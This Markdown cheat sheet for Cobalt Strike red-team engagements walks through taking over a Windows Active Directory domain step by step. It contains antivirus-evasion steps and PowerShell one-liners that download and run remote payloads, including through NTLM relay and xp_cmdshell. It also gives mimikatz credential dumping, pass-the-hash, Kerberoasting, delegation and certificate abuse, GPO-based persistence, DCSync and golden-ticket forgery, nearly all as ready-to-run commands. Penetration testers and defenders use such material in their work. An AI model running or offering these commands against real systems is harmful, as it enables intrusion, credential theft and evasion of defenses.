---
description: basic commands and tools to use during an engagement
---

# Cobalt Strike Red Team Cheat Sheet

### Start CS

```
./teamserver <IP> <Password> <path_to_profile>
```

### Implement Defense Evasion with artifact kit and resource kit

Modify src-common/bypass-pipe.c based on what threat checker flags on

rebuild payloads

```
./build.sh
```

pscp contents over and check test against ThreatChecker

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe
```

Threat Checker

```
C:\>Tools\ThreatCheck\ThreatCheck.exe -f <Path to artifact.exe>
```

#### Resource Kit

check what triggers on PS scripts

```
C:\>Tools\ThreatCheck\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
```

Using a simple Find & Replace for `$x` - > `$i` and `$var_code` -> `$var_banana` seems to be enough:

Powershell command for inital access

```
iex (new-object net.webclient).downloadstring("http://IPADDRESS/uri_path")
```

### Host Enumeration for PrivEsc

Seatbelt - ton to sift through, start with SharpUp to start

```
execute-assembly C:\Tools\SeatBelt\Seatbelt.exe -group=system
```

SharpUp - make sure to build it

```
execute-assembly C:\Tools\SharpUp\SharpUp.exe
```

Get user ID and global group membership info

```
getuid

run net user <USER> /domain
```

Get services

```
run sc query
```

look for unquoted service paths with a space between

```
run wmic service get name, pathname
```

get permissions to unquoted service path

```
powershell Get-Acl -Path "Path to Vulnerable Services" | fl
```

Looking for BUILTIN\User with WriteAccess

#### Create peer-to-peer listener

go to Cobalt Strike -> Listeners -> Add -> Beacon TCP -> Save

CD to vulnerable service and replace the service with payload

```
 upload C:\Payloads\beacon-tcp-svc.exe
 mv beacon-p2p-tcp-svc.exe <name of vuln exe>
```

#### Start vuln service and connect to it

Stop service and start it

```
 run sc stop <Service>
 run sc start <Service>
```

look for listening on payload port (4444)

```
run netstat -anp tcp 
```

then connect to the port

```
connect localhost <port>
```

### Domain Recon with PowerView

PowerView

```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```

Recon commands

```powershell
# Get Domains for enterprise
powershell Get-Domain

# Get Domain Controllers
powershell Get-DomainController | select Forest, Name, OSVersion | fl

# Get Forests
powershell Get-ForestDomain

# Get domain policy
powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess

# Get all the users
powershell Get-DomainUser

# Get Specific Domain User Properties
powershell Get-DomainUser -Identity <USER> -Properties DisplayName, MemberOf | fl

# Get Domain Computers (DNS Names)
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

# Get Domain OUs
powershell Get-DomainOU -Properties Name | sort -Property Name

# Get Domain Groups
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

# Get Domain Group Members
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName

# Get GPOs
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

# Get Workstation GPOs
powershell Get-DomainGPO -ComputerIdentity <WORKSTATION> -Properties DisplayName | sort -Property DisplayName

# Get GPOs that modify local groups membership
powershell Get-DomainGPOLocalGroup

# Get where user/group is member of specific local group
 powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
 
 # Get where logged on
 powershell Find-DomainUserLocation | select UserName, SessionFromName
 
 # Get current logged on sessions
 powershell Get-NetSession -ComputerName <COMPUTERNAME> | select CName, UserName
 
 # Get domain trusts
 powershell Get-DomainTrust
```

### Lateral Movement

Testing access

```
ls \\<HOSTNAME>\c$
```

#### Pivot Listeners

To start a Pivot Listener on an existing Beacon, right-click it and select **Pivoting > Listener**. Once started, your selected port will be bound on that machine.

```
run netstat -anp tcp
```

things to keep in mind:

* If port 445 is closed on the target, you can't use SMB listeners.
* If the target firewall doesn't allow arbitrary ports inbound, you can't use TCP listeners.
* If the current machine doesn't allow arbitrary ports inbound, you can't use Pivot listeners. but if you have admin access on the target, you can change what ports are allowed.

To create FW rule on target:

```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
```

To remove FW rule

```
netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
```

#### PS Remoting

```
jump winrm64 <HOSTNAME> <LISTENER>
```

#### PsExec

```
jump psexec64 <HOSTNAME> <LISTENER>
```

#### WMI

```
 cd \\<TARGET HOST>\ADMIN$
 upload <PATH TO PAYLOAD ON ATTACK COMPUTER>
 remote-exec wmi <TARGET HOST> <PATH TO PAYLOAD ON TARGET COMPUTER>

 link <TARGET HOST>
```

**CoInitializeSecurity**

If you get... CoInitializeSecurity already called. Thread token (if there is one) may not get used.

```
 execute-assembly C:\Tools\SharpWMI\SharpWMI.exe action=exec computername=<TARGET> command="<PATH TO PAYLOAD ON TARGET>"
```

#### DCOM

```
 powershell-import C:\Tools\Invoke-DCOM.ps1

 powershell Invoke-DCOM -ComputerName <TARGET> -Method MMC20.Application -Command <PATH TO PAYLOAD ON TARGET>

 link <TARGET HOST>
```

#### dump creds

```
# shorthand method
logonpasswords

# full command with mimi
 mimikatz sekurlsa::logonpasswords
 
# Kerberos encryption keys
mimikatz sekurlsa::ekeys
 
# SAM Database
mimikatz lsadump::sam
 
# cached credentials
mimikatz lsadump::cache

```

After dumping these credentials, go to **View > Credentials** to see a copy of them.

The **aes256\_hmac** and **aes128\_hmac** (if available) fields are used with Overpass the Hash

#### Make Token

&#x20;If we have the plaintext password (provided here), we can use `make_token` with that information.

```
make_token <DOMAIN>\<USER> <Password>
```

#### Process injection

```
# List Processes
ps

# inject into target 
inject <PID> <x64/x86> <listener-name>
```

#### Token Impersonation

```
# List Processes
ps

# Steal token  
steal_token <PID>
```

### SpawnAs

The `spawnas` command will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it. This creates a new logon session with the interactive logon type which makes it good for local actions, but also creates a whole user profile on disk if not already present.

```
# Run from directory current user has access to
spawnas <Domain>\<USER> <PASSWORD> <LISTENER>
```

### PassTheHash

```
pth <Domain>\<USER> <hash>
```

It passes the token over a named pipe which Beacon then impersonates automatically.

To avoid the `\\.\pipe\` indicator, we can execute Mimikatz manually and specify our own process.

```
 mimikatz sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH
 
 
 ## look for PID in the output
 # steal token
 steal_token <PID>
 
```

### Over Pass The Hash

[Rubeus](https://github.com/GhostPack/Rubeus) allows us to perform opth without needing elevated privileges. The process to follow is:

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:jking /domain:child.test.local /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap
```

Open Powershell and copy the TGT

```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
```

or bash:

```
root@kali:~# echo -en "[...ticket...]" | base64 -d > jkingTGT.kirbi
```

Use the ticket

```
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
```

IF ELEVATED - WITH AES KEY

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:jking /domain:child.test.local /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

# find pid and steal token
steal_token <PID>
```

### Extracting Kerberos Tickets

```
# List all kerberos tickets
 execute-assembly C:\Tools\Rubeus\Rubeus.exe triage

# dump TGT 
 execute-assembly C:\Tools\Rubeus\Rubeus.exe dump /service:krbtgt /luid:TARGET LUID /nowrap

# create sacrificial process
 execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 
 # Pass the ticket into new process
 execute-assembly C:\Tools\Rubeus\Rubeus.exe ptt /luid:NEW LUID /ticket:[...base64-ticket...]
 
 # steal token
 steal_token 4872
```

### Socks Proxy

Start Socks Proxy on beacon

```
socks <PORT, Usually 9050 by default >
```

Confirm bind port on Kali

```
ss -lpnt
```

Update /etc/proxychains.conf

```
socks4 127.0.0.1 <socks port listed>
```

#### Scanning

```
proxychains nmap -n -Pn -sT -p<PORTS> <IP>
```

### Reverse Port Forward

Open port on relay host

```
# empty template
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp

# example
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.100 connectport=4444 protocol=tcp
```

Test script to confirm inbound connections

```powershell
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
  $client = $listener.AcceptTcpClient()
  Write-Host "A client has connected"
  $client.Close()
}
```

connect from DC1 to AD

```
Test-NetConnection -ComputerName 10.10.10.100 -Port 4444
```

#### CS rportfwd

```
rportfwd <LOCAL PORT to Listen ON> <Destination IP> <DESTINATION PORT>

# confirm running
run netstat -anp tcp
```

Beacon also has a `rportfwd_local` command.  Whereas `rportfwd` will tunnel traffic to the Team Server, `rportfwd_local` will tunnel the traffic to the machine running the Cobalt Strike client.

```
# this example just forwards to itself 
rportfwd_local 8080 127.0.0.1 8080
```

### NTLM Relay

NTLM Relay with PortBender load driver first

```
upload C:\Tools\PortBender\WinDivert64.sys
```

Next, load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console. Redirect 445 traffic to 8445

```
PortBender redirect 445 8445
```

forward this to kali server

```
rportfwd 8445 127.0.0.1 445
```

confirm socks is on

```
socks 1080
```

NTLM relay to server to dump SAM database

```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.10.102 -smb2support --no-http-server --no-wcf-server
```

get command execution

```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.10.102 -smb2support --no-http-server --no-wcf-server -c
'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.10.100:8080/b\")"'
```

### Credential Manager

List credentials stored

```
ls C:\Users\pickle.rick\AppData\Local\Microsoft\Credentials

run vaultcmd /listcreds:"Windows Credentials" /all

mimikatz vault::list
```

To decrypt the credential, we need to find the master encryption key.

```
mimikatz dpapi::cred /in:C:\Users\pickle.rick\AppData\Local\Microsoft\Credentials\<blob>
```

The **pbData** field contains the encrypted data and the **guidMasterKey** contains the GUID of the key needed to decrypt it. The Master Key information is stored within the user's `AppData\Roaming\Microsoft\Protect` directory (where `S-1-5-21-*` is their SID).

```
ls C:\Users\pickle.rick\AppData\Roaming\Microsoft\Protect\S-1-5-21-<USER SID>
```

There are a few ways to get the Master Key. If you have access to a high integrity session, run `sekurlsa::dpapi`

If not you can access it using mimikatz and an exposed RPC service on the DC. Run `mimikatz dpapi::masterkey`, provide the path to the Master Key information and specify `/rpc`

```
 mimikatz dpapi::masterkey /in:C:\Users\pickle.rick\AppData\Roaming\Microsoft\Protect\S-1-5-21-<USER SID>\<guidMasterKey> /rpc
```

The **key** field is the key needed to decrypt the credential  `dpapi::cred`.

```
mimikatz dpapi::cred /in:C:\Users\pickle.rick\AppData\Local\Microsoft\Credentials\blob /masterkey:<master key>
```

#### Chrome Credentials

```
 execute-assembly C:\Tools\SharpChromium\SharpChromium.exe logins
```

### Kerberoast

`Rubeus kerberoast` can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /simple /nowrap
```

To find kerberoast accounts

```
execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```

for a specific account use `/user` argument.

```
 execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /user:svc_mssql /nowrap
```

#### cracking the hash

Use `--format=krb5tgs --wordlist=wordlist svc_mssql` for **john** or `-a 0 -m 13100 svc_mssql wordlist` for **hashcat**.

```
root@kali:~# john --format=krb5tgs --wordlist=wordlist svc_mssql
```

### ASEP Roast

Find the account to roast

```
execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

Start roasting

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asreproast /user:<USER> /nowrap
```

Use `--format=krb5asrep --wordlist=wordlist svc_oracle` for **john** or `-a 0 -m 18200 svc_oracle wordlist` for **hashcat**.

```
root@kali:~# john --format=krb5asrep --wordlist=wordlist <USER>
```

### Unconstrained Delegation

```
execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

Monitor for a specific TGT while on a server with unconstrained delegation

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /targetuser:<USER> /interval:10
```

save ticket

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\user.kirbi", [System.Convert]::FromBase64String("..."))
```

Use ticket

```
 make_token DOMAIN\USER Password

 kerberos_ticket_use C:\Users\Administrator\Desktop\user.kirbi
```

#### Printer Bug

Monitor for a specific ticket from a server with unconstrained delegation

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /targetuser:<TARGET>$ /interval:10 /nowrap
```

Force cohorsion with another wks

```
execute-assembly C:\Tools\SpoolSample\SpoolSample.exe <TARGET> <Unconstrained Host>
```

save ticket

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\target.kirbi", [System.Convert]::FromBase64String("..."))
```

Use token and use ticket

```
 make_token DOMAIN\TARGET$ password

 kerberos_ticket_use C:\Users\Administrator\Desktop\target.kirbi
```

### Constrained Delegation

Find all accounts or computers with Constrained Delegation

```
execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

list current tickets

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe triage
```

dump krbtgt

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
```

request the msdsspn for a constrained delegation user/server and a known user who can access it

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/wkstn-2.child.test.local /user:srv-2$ /ticket:do...=  /nowrap
```

Create kirbi from ticket that was returned

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc-2.kirbi", [System.Convert]::FromBase64String("doI...="))
```

import kirbi file

```
make_token CHILD\USER password

kerberos_ticket_use C:\Users\Administrator\Desktop\cifs-workstation.kirbi
```

### Alternate Service Name

dump krbtgt

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
```

request the msdsspn for a constrained delegation user/server and a known user who can access it

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:eventlog/dc.child.test.local /altservice:cifs /user:srv-2$ /ticket:do...=
  /nowrap
```

Create kirbi from ticket that was returned

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc.kirbi", [System.Convert]::FromBase64String("doI...="))
```

import kirbi file

```
make_token CHILD\USER password

kerberos_ticket_use C:\Users\Administrator\Desktop\cifs-dc.kirbi

ls \\dc-2.child.test.local\c$
```

### S4U2 Abuse

get ticket from target using spoolsample and unconstrained delegation to get a workstation$ TGT Monitor for a specific ticket from a server with unconstrained delegation

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /targetuser:workstation$ /interval:10 /nowrap
```

Force cohorsion with another wks

```
execute-assembly C:\Tools\SpoolSample\SpoolSample.exe <TARGET> <UNCONSTRAINED Server>
```

save ticket

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn.kirbi", [System.Convert]::FromBase64String("..."))
```

then request a TGS, it will have a failure message at the bottom but thats okay we just want the TGS outputted

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /user:<TARGET>$ /msdsspn:cifs/workstation.child.test.local /impersonateuser:nlamb /ticket:doIF...P  /nowrap
```

save ticket

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\s4u2self.kirbi", [System.Convert]::FromBase64String("..."))
```

open TGS in ASN.1 Editor replace the general string wkstn-2$ to cifs or whatever service you want to impersonate. and add a node underneath with the hex 1b. give that new node a value of the FQDN.

confirm ticket is updated

```
C:\Tools\Rubeus\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\s4u2self.kirbi
```

import kirbi file

```
make_token CHILD\USER password

kerberos_ticket_use C:\Users\Administrator\Desktop\cifs-dc.kirbi
```

### Active Dirtectory Certificate Services

find vulnerable AD CD CA's

```
execute-assembly C:\Tools\Certify\Certify.exe cas
```

This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain.

Take the private key and certificate. Copy and paste it into Kali and name it cert.pem

convert to pfx

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Convert `cert.pfx` into a base64 encoded string:  `cat cert.pfx | base64 -w 0` and use `Rubeus asktgt` to request a TGT using this certificate.

Request TGT for `target_user`

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:target_user /certificate:... /password:password /aes256 /nowrap
```

#### NTLM Relaying to ADCS HTTP Endpoints

As SYSTEM on unconstrained delegation SRV:

```
 PortBender redirect 445 8445

 rportfwd 8445 127.0.0.1 445

 socks 1080
```

Start ntlm relay

```
proxychains ntlmrelayx.py -t http://10.10.10.120/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

Next, use one of the remote authentication methods to force a connection from workstation to SRV.

```
execute-assembly C:\Tools\SpoolSample\SpoolSample.exe <TARGET> <UNCONSTRAINED Server>
```

After obtaining a TGT with the certificate, the S4U2self trick can be used to obtain a TGS for any service on the machine, on behalf of any user.

#### User Persistence

In this example, I have a Beacon running as **TEST\USER**.  Use Certify to find all the certificates that permit client authentication:

```
 execute-assembly C:\Tools\Certify\Certify.exe find /clientauth

execute-assembly C:\Tools\Certify\Certify.exe request /ca:dc.child.test.local\ca /template:User
```

This certificate allows us to request a TGT for TEST\USER using Rubeus

#### Computer Persistence

```
execute-assembly C:\Tools\Certify\Certify.exe request /ca:dc.child.test.local\ca /template:Machine /machine
```

The `/machine` parameter tells Certify to auto-elevate to SYSTEM and assume the identity of the machine account.

### Group Policy

This PowerView query will show the Security Identifiers (SIDs) of principals that can create new GPOs in the domain, which can be translated via `ConvertFrom-SID`.

```
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=child,DC=test,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

powershell ConvertFrom-SID <SID>
```

This query will return the principals that can write to the GP-Link attribute on OUs:

```
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

You can also get a list of machines within an OU.

```
powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=<OU HERE>" } | select DnsHostName
```

This query will return any GPO in the domain, where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**. Filtering on a 4-digit RID is a quick way to eliminate the default 5xx results.

```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-<DOMAIN SID>-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

To resolve the ObjectDN:

```
powershell Get-DomainGPO -Name "<ObjectDN>" -Properties DisplayName
```

#### Remote Server Administration Tools (RSAT)

The GroupPolicy module has several PowerShell cmdlets that can be used for administering GPOs, including:

* New-GPO: Create a new, empty GPO.
* New-GPLink: Link a GPO to a site, domain or OU.
* Set-GPPrefRegistryValue: Configures a Registry preference item under either Computer or User Configuration.
* Set-GPRegistryValue: Configures one or more registry-based policy settings under either Computer or User Configuration.
* Get-GPOReport: Generates a report in either XML or HTML format.

Create GPO with RSAT

```
powershell New-GPO -Name "Test GPO" | New-GPLink -Target "OU=<OU>,DC=<Domain>,DC=<Domain>,DC=<Domain>"
```

Being able to write anything, anywhere into the HKLM or HKCU provides the ability to gain perisistence on every hosy apart of the GPO

```
# Find Domain Share
powershell Find-DomainShare -CheckShareAccess

# Drop beacon payload off
cd \\dc\software
upload C:\Payloads\pivot.exe

# create registry value to run payload on boot in new GPO
powershell Set-GPPrefRegistryValue -Name "Test GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc\software\pivot.exe" -Type ExpandString
```

Force updates on a specific computer

```
run gpupdate /target:computer /force
```

**SharpGPOAbuse**

```
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Discretionary Access Control Lists

Look for **GenericAll**, **WriteProperty** or **WriteDacl** on user

```
powershell Get-DomainObjectAcl -Identity <USER> | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-<DOMAIN SID>-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl
```

We could also cast a wider net and target entire OUs.

```
powershell Get-DomainObjectAcl -SearchBase "CN=BLAH,DC=child,DC=test,DC=domain" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-<DOMAIN SID>-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

With access like GenericAll we can change passwords, make an account kerberoastable, or modify domain membership

```
run net user <USER> <PASSWORD> /domain
```

create Kerberoast account

```
# assign SPN
powershell Set-DomainObject -Identity <USER> -Set @{serviceprincipalname="SOME/THING"}

powershell Get-DomainUser -Identity <USER> -Properties ServicePrincipalName

# kerberoast
execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /user:<USER> /nowrap

# clear spn
powershell Set-DomainObject -Identity <USER> -Clear ServicePrincipalName
```

Modify the User Account Control value on the account to disable preauthentication and then ASREProast it.

```
# Get current UAC Values to confirm original settings
powershell Get-DomainUser -Identity <USER> | ConvertFrom-UACValue

# add no pre-auth setting
powershell Set-DomainObject -Identity <USER> -XOR @{UserAccountControl=4194304}

# ASREPRoast
 execute-assembly C:\Tools\Rubeus\Rubeus.exe asreproast /user:<USER> /nowrap
 
 # remove no pre-auth setting
 powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
 
 # confirm original settings
 powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
```

Modify Group Membership

```
run net group "Some Group" <USER> /add /domain
```

### MS SQL

Find MS SQL servers

```
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1

powershell Get-SQLInstanceDomain

# Test Connection
powershell Get-SQLConnectionTest -Instance "<SERVER>" | fl
```

Get Info

```
powershell Get-SQLServerInfo -Instance "<SERVER>"

# Get info for all Accessible Servers
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

Command Execution

```
powershell Invoke-SQLOSCmd -Instance "<SERVER>" -Command "whoami" -RawResults
```

To execute manually, try:

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

powershell Get-SQLQuery -Instance "<SERVER>" -Query "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';"

# A value of **0** shows that xp_cmdshell is disabled. To enable it:

powershell Get-SQLQuery -Instance "<SERVER>" -Query "sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# download and run payload 
powershell Get-SQLQuery -Instance "sql.rto.local,1433" -Query "EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';"
```

Base64 encode command

```powershell
$str = 'IEX((new-object net.webclient).downloadstring("http://<IP>:<PORT>/URI"))'

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip 
```

#### MS SQL Privilege Escalation

&#x20;`NT Service\MSSQL$SQLEXPRESS`, is generally configured with a privilege called `SeImpersonatePrivilege`. [SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.

```
# Confirm Privs
execute-assembly C:\Tools\SeatBelt\Seatbelt.exe TokenPrivileges

execute-assembly C:\Tools\SweetPotato\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc ..."
```

### Domain Dominance

Add DCSync rights, if needed

```
powershell Add-DomainObjectAcl -TargetIdentity "DC=CHILD,DC=TEST,DC=LOCAL" -PrincipalIdentity <USER> -Rights DCSync
```

DCSync

```
dcsync child.DOMAIN.local CHILD\krbtgt
```

Golden Ticket

```
# create golden ticket
mimikatz kerberos::golden /user:Administrator /domain:child.DOMAIN.local  /sid:S-1-5-21-<DOMAIN SID> /aes256:<KRBTGT AES HASH> /ticket:golden.kirbi

# use ticket
make_token DEV\Administrator password

# may need to download kirbi onto box if mimikatz was used on compromised host
kerberos_ticket_use C:\Users\Administrator\Desktop\golden.kirbi

# drop golden ticket
rev2self
```

Forged Certificates Once on a CA, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) can extract the private keys.

```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Debug\SharpDPAPI.exe certificates /machine
```

The next step is to build the forged certificate with [ForgeCert](https://github.com/GhostPack/ForgeCert).

```
C:\Users\Administrator\Desktop>C:\Tools\ForgeCert\ForgeCert\bin\Debug\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@cyberbotic.io" --NewCertPath fake.pfx --NewCertPassword "password"
```

Even though you can specify any SubjectAltName, the user does need to be present in AD

Then we can simply use Rubeus to request a legitimate TGT with this forged certificate and use it to access the domain controller.

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:Administrator /domain:test.domain /certificate:<pfx cert> /password:password /nowrap

make_token TEST\Administrator password

kerberos_ticket_use C:\Users\Administrator\Desktop\admin-tgt.kirbi
```

### Domain Trusts

Get Domain Trusts

```
powershell Get-DomainTrust

SourceName      : child.test.local
TargetName      : test.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
```

since there is a bidirectional trust in the child domain, we can forge a golden ticket for access into the parent domain

```
powershell Get-DomainGroup -Identity "Domain Admins" -Domain <PARENT DOMAIN> -Properties ObjectSid
```

Create ticket

```
mimikatz # kerberos::golden /user:Administrator /domain:child.test.local /sid:S-1-5-21-<Child domain SID> /sids:S-1-5-21-<Parent SID>-512 /aes256:<KRBTGT Hash> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:golden.kirbi
```

Where:

* `/user` is the username to impersonate.
* `/domain` is the current domain.
* `/sid` is the current domain SID.
* `/sids` is the SID of the target group to add ourselves to.
* `/aes256` is the AES256 key of the current domain's krbtgt account.
* `/startoffset` sets the start time of the ticket to 10 mins before the current time.
* `/endin` sets the expiry date for the ticket to 60 mins.
* `/renewmax` sets how long the ticket can be valid for if renewed.

Use ticket

```
make_token TEST\Administrator password
 kerberos_ticket_use C:\Users\Administrator\Desktop\golden.kirbi
```

#### One-Way (Inbound)

```
powershell Get-DomainTrust

SourceName      : child.test.local
TargetName      : test.external
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
```

Because the trust is inbound from our perspective, it means that principals in our domain can be granted access to resources in the foreign domain. We can enumerate the foreign domain across the trust.

```
powershell Get-DomainComputer -Domain test.external -Properties DNSHostName

dnshostname           
-----------           
dc.test.external
```

Look for Foreign groups and return the members

```
powershell Get-DomainForeignGroupMember -Domain test.external
```

To hop the trust, we need to impersonate a member of this domain group.

If you only have the user's RC4/AES keys, we can still request Kerberos tickets with Rubeus but it's more involved. We need an inter-realm key which Rubeus won't produce for us automatically, so we have to do it manually.

First, we need a TGT for the principal in question. This TGT will come from the current domain.

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:<USER> /domain:child.test.local /aes256:<AES HASH> /opsec /nowrap
```

Next, request a referral ticket from the current domain, for the target domain.

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgs /service:krbtgt/test.external /domain:child.test.local /dc:dc.child.test.local /ticket: ... /nowrap
```

Finally, use this inter-realm TGT to request a TGS in the target domain.

```
 execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgs /service:cifs/dc.test.external /domain:dc.test.external /dc:dc.test.external /ticket: ... /nowrap
```

Create a sacrificial logon session and import the ticket.

```
make_token TEST\USER password

kerberos_ticket_use C:\Users\Administrator\Desktop\one-way-inbound.kirbi
```

#### One-Way (Outbound)

```
powershell Get-DomainTrust -Domain test.local

SourceName      : test.local
TargetName      : outbound.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
```

The strategy is to find principals in `test.local` that are not native to that domain, but are from `outbound.local`.

```
 powershell Get-DomainForeignGroupMember -Domain test.local

GroupDomain             : test.local
GroupName               : Jump Users
GroupDistinguishedName  : CN=Jump Users,CN=Users,DC=test,DC=local
MemberDomain            : test.local
```

